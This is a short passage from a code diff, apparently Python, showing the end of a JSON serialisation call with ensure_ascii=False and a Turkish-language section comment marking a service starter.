+        }, ensure_ascii=False)
 
 
 # ─── Servis başlatıcı ─────────────────────────────────────────────────────
